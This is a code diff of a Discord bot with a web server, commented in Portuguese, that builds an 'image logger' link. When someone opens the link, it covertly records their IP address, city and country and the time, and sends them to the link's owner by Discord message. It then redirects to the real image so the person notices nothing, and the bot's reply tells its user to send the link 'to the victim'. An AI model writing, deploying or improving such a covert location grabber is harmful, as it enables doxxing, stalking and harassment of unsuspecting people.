@@ -1,12 +1,8 @@
-const { Client, GatewayIntentBits, Collection } = require('discord.js');
+const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 const geoip = require('geoip-lite');
-const fs = require('fs');
-const path = require('path');
+const { v4: uuidv4 } = require('uuid');
 
-const storage = require('./utils/storage');
-
-// ===== DISCORD BOT =====
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -15,130 +11,88 @@ const client = new Client({
   ]
 });
 
-client.commands = new Collection();
+const app = express();
+const links = {};
+const userLogs = {};
+client.awaitingImage = {};
 
-// Carrega comandos
-const commandsPath = path.join(__dirname, 'commands');
-const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
-
-for (const file of commandFiles) {
-  const command = require(path.join(commandsPath, file));
-  client.commands.set(command.name, command);
-}
-
-// Evento: bot pronto
-client.once('ready', () => {
-  console.log(`🤖 Bot logado como ${client.user.tag}`);
-});
-
-// Evento: mensagens
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
   
   const prefix = '!';
+  
   if (!message.content.startsWith(prefix)) {
-    // Verifica se está aguardando imagem
-    if (client.awaitingImage?.[message.author.id]) {
+    if (client.awaitingImage[message.author.id]) {
       const attachment = message.attachments.first();
-      
       if (!attachment || !attachment.contentType?.startsWith('image/')) {
         delete client.awaitingImage[message.author.id];
-        return message.reply('❌ Isso não é uma imagem!');
+        return message.reply('❌ Envie uma imagem!');
       }
       
-      // Cria link
-      const link = storage.createLink(message.author.id, attachment.url);
-      const domain = process.env.DOMAIN || `http://localhost:${process.env.PORT || 3000}`;
+      const id = uuidv4().split('-')[0];
+      links[id] = {
+        url: attachment.url,
+        owner: message.author.id,
+        clicks: 0
+      };
       
       delete client.awaitingImage[message.author.id];
       
       return message.reply(
         `✅ **Link gerado!**\n\n` +
-        `🔗 \`${domain}/i/${link.id}\`\n\n` +
-        `Quando alguém clicar, você recebe os dados no canal de logs!`
+        `🔗 \`${process.env.DOMAIN}/i/${id}\`\n\n` +
+        `Manda esse link pra vítima!`
       );
     }
     return;
   }
   
-  // Processa comandos
   const args = message.content.slice(prefix.length).trim().split(/ +/);
-  const commandName = args.shift().toLowerCase();
+  const cmd = args.shift().toLowerCase();
   
-  const command = client.commands.get(commandName);
-  if (!command) return;
+  if (cmd === 'ping') {
+    return message.reply(`🏓 Ping: ${Date.now() - message.createdTimestamp}ms`);
+  }
   
-  try {
-    await command.execute(message, client);
-  } catch (error) {
-    console.error(error);
-    message.reply('❌ Erro ao executar comando!');
+  if (cmd === 'gerar') {
+    client.awaitingImage[message.author.id] = true;
+    return message.reply('📤 Envie a imagem agora (30 segundos)!');
+  }
+  
+  if (cmd === 'logs') {
+    const channel = message.mentions.channels.first() || message.channel;
+    userLogs[message.author.id] = channel.id;
+    return message.reply(`✅ Logs em: ${channel}`);
   }
 });
 
-// ===== SERVIDOR WEB =====
-const app = express();
-
 app.get('/i/:id', async (req, res) => {
-  const link = storage.getLink(req.params.id);
-  if (!link) return res.status(404).send('Link não encontrado');
+  const link = links[req.params.id];
+  if (!link) return res.send('Link inválido');
   
-  // Coleta dados
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
   const geo = geoip.lookup(ip);
   
-  const logData = {
-    ip,
-    location: geo ? `${geo.city}, ${geo.region}, ${geo.country}` : 'Desconhecido',
-    userAgent: req.headers['user-agent'],
-    time: new Date().toLocaleString('pt-BR')
-  };
+  link.clicks++;
   
-  // Salva log
-  storage.addLog(req.params.id, logData);
+  const logMsg = `📸 **NOVO CLICK!**\nIP: \`${ip}\`\nLocal: ${geo ? geo.city + ', ' + geo.country : 'Desconhecido'}\nHorário: ${new Date().toLocaleString('pt-BR')}`;
   
-  // Envia pro Discord
-  const channelId = storage.getLogChannel(link.userId);
-  
-  try {
-    // Tenta canal configurado
-    if (channelId) {
-      const channel = await client.channels.fetch(channelId);
-      if (channel) {
-        await channel.send(
-          `📸 **NOVO CLICK!**\n` +
-          `IP: \`${logData.ip}\`\n` +
-          `📍 Local: ${logData.location}\n` +
-          `⏰ Horário: ${logData.time}`
-        );
-      }
-    }
-    
-    // Tenta DM
-    const user = await client.users.fetch(link.userId);
-    await user.send(
-      `📸 Alguém clicou no seu link!\n\n` +
-      `IP: \`${logData.ip}\`\n` +
-      `Localização: ${logData.location}\n` +
-      `Horário: ${logData.time}`
-    );
-  } catch (e) {
-    console.log('Erro ao enviar log:', e.message);
+  const channelId = userLogs[link.owner];
+  if (channelId) {
+    const channel = await client.channels.fetch(channelId).catch(() => null);
+    if (channel) channel.send(logMsg);
   }
   
-  // Redireciona pra imagem real
-  res.redirect(link.imageUrl);
+  const user = await client.users.fetch(link.owner).catch(() => null);
+  if (user) user.send(logMsg);
+  
+  res.redirect(link.url);
 });
 
-app.get('/', (req, res) => {
-  res.json({ status: 'online', bot: 'discord-image-logger' });
-});
+app.get('/', (req, res) => res.send('Bot online!'));
 
-// ===== INICIA TUDO =====
 const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, () => {
-  console.log(`🌐 Servidor rodando na porta ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🌐 Servidor: ${PORT}`));
 
 client.login(process.env.DISCORD_TOKEN);
+console.log('🤖 Bot iniciando...');
